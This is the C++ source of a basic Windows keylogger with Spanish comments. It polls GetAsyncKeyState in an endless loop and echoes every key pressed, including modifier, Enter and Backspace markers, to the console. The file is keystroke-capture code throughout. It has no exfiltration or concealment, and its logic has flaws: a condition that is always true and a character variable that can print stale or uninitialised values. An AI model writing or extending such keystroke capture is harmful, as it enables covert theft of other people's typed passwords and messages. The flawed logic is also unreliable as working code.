#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

/*-------------- CONSTANTES --------------*/
#define PLUS 43
#define COMMA 44
#define DASH 45
#define DOT 46
#define ALT 164
#define CTRL 163

/*-------------- FIN CONSTANTES --------------*/




void registerKeys();
bool verifyCapitalKey();
char getAlphaKeys(short int);
char getNumberKeys(short int);
char simpleCharacters(short int);
void verifyOtherKeys(short int);

int main()
{
    registerKeys();
    return 0;
}

void registerKeys(){
    bool vkCapital;
    char digitAscii;
    //Este ciclo nos ayudara a capturar siempre, la tecla que pulsa el usuario.
    while(true){
        //Comprobamos el estado de la tecla Bloq mayuscula antes de entrar al segundo ciclo
        vkCapital = verifyCapitalKey();
        //Con este ciclo detectamos la tecla pulsada por el usuario.
        for(short int i = 0; i < 255; i++){
            //Aqu� la condici�n evalua si una tecla es presionada y gracias al ciclo for podemos saber cual es, el -32767
            //es debido a que si no se lo ponemos realiza muchas veces la acci�n de adentro del if en cambio as� solo lo hace 1 vez
            if(GetAsyncKeyState(i) == -32767 && i != VK_CAPITAL){
                if(i >= 65 && i <= 90){
                    digitAscii = getAlphaKeys(i);
                    if(vkCapital == false){
                        digitAscii = tolower(digitAscii);
                    }
                } else if(i >= 48 && i <= 57){
                    digitAscii = getNumberKeys(i);
                } else if(i >= 186 && i <= 191 || i == 32){
                    digitAscii = simpleCharacters(i);
                }
                if((i >= 16 && i <= 27) || i == VK_BACK || i == VK_RETURN || ALT || i == VK_SNAPSHOT){
                    verifyOtherKeys(i);
                }
                cout << digitAscii;
            }
        }
    }
}

//En esta funci�n detectamos si la letra de mayuscula esta activada.
bool verifyCapitalKey(){
    bool on;
    if(GetKeyState(VK_CAPITAL)){
        on = true;
    } else {
        on = false;
    }

    return on;
}

char getAlphaKeys(short int i){
    char digitAscii = (char)i;
    return digitAscii;
}

char getNumberKeys(short int i){
    char digitAscii = (char)i;
    return digitAscii;
}

char simpleCharacters(short int i){
    char digitAscii;
    if(i == 0xBB){
        digitAscii = (char)PLUS;
    } else if(i == 0xBC){
        digitAscii = (char)COMMA;
    } else if(i == 0xBD){
        digitAscii = (char)DASH;
    } else if(i == 0xBE){
        digitAscii = (char)DOT;
    } else if(i == 0x20){
        digitAscii = (char)i;
    }

    return digitAscii;
}

void verifyOtherKeys(short int i){
    if(i == VK_MENU || i == ALT){
        cout << "[ALT]";
    } else if(i == VK_CONTROL || i == CTRL){
        cout << "[CTRL]";
    } else if(i == VK_SHIFT){
        cout << "[SHIFT]";
    } else if(i == VK_RETURN){
        cout << "[ENTER]" << endl;
    } else if(i == VK_BACK){
        cout << "[BACK]";
    } else if(i == VK_ESCAPE){
        cout << "[ESC]";
    } else if(i == VK_SNAPSHOT){
        cout << "[IMP PNT]";
    }
}
